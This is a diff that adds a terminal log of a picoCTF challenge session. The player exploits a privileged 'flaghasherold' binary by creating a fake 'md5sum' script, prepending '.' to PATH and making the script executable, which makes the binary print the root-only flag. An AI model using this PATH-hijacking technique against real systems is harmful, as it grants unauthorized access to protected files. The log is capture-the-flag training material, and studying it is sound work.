@@ -1,0 +1,37 @@
+$ ssh ctf-player@shape-facility.picoctf.net -p 59673
+ctf-player@shape-facility.picoctf.net's password: 
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.8.0-1024-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Fri Mar 28 13:11:50 2025 from 127.0.0.1
+ctf-player@pico-chall$ echo '#!/bin/bash'bash
+#!/bin/bash
+ctf-player@pico-chall$ ls /bin/bash
+/bin/bash
+ctf-player@pico-chall$ echo '#!/bin/bash' >md5sum
+ctf-player@pico-chall$ echo 'cat $1' >>md5sum
+ctf-player@pico-chall$ ./flaghasherold 
+Computing the MD5 hash of /root/flag.txt.... 
+
+8c9735f569157a799a98bd2014190786  /root/flag.txt
+ctf-player@pico-chall$ export PATH=.:$PATH
+ctf-player@pico-chall$ ./l flaghasherold 
+Computing the MD5 hash of /root/flag.txt.... 
+
+8c9735f569157a799a98bd2014190786  /root/flag.txt
+ctf-player@pico-chall$ chmod u+x md5sum
+ctf-player@pico-chall$ chmod +x md5sum
+ctf-player@pico-chall$ ./flaghasherold 
+Computing the MD5 hash of /root/flag.txt.... 
+
+picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_63a87fa9}ctf-player@pico-chall$ 
+ctf-player@pico-chall$ exit
+logout
+Connection to shape-facility.picoctf.net closed.
